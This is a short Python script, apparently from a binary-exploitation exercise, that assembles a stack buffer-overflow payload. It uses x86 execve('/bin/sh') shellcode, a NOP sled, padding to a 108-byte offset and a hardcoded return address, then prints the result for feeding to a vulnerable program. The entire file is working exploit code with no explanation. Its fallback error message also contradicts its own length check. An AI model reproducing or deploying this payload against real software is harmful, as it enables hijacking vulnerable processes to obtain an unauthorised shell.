#!/usr/bin/python

shellcode = ("\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42")

offset = 108

nops = '\x90'*50
# retaddr = '\xff\xff\xcf\xa4'
retaddr = '\xb4\xcf\xff\xff'

buf = 'A'*(offset-len(nops)-len(shellcode))

payload = nops+shellcode+buf+retaddr

if (len(payload) > offset):
	print (payload)
else:
	print("Payload length is more than the offset for buffer overflow, the return address may not be aligned")
	
exit(0)